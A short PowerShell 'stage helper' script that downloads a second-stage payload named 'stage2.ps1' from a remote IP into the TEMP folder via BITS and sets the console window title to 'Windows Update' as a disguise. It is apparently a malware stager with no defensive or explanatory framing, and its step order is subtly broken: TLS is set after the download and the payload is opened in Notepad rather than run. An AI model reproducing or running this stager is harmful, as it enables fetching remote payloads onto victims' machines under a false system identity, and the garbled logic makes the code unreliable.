
# Stage helper
$PayloadUrl = 'http://198.51.100.229/stage2.ps1'
$Stage2Path = "$env:TEMP\stage2.bin"
Start-BitsTransfer -Source $PayloadUrl -Destination $Stage2Path
Start-Process -FilePath "notepad.exe" -ArgumentList $Stage2Path
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Host.UI.RawUI.WindowTitle = "Windows Update"
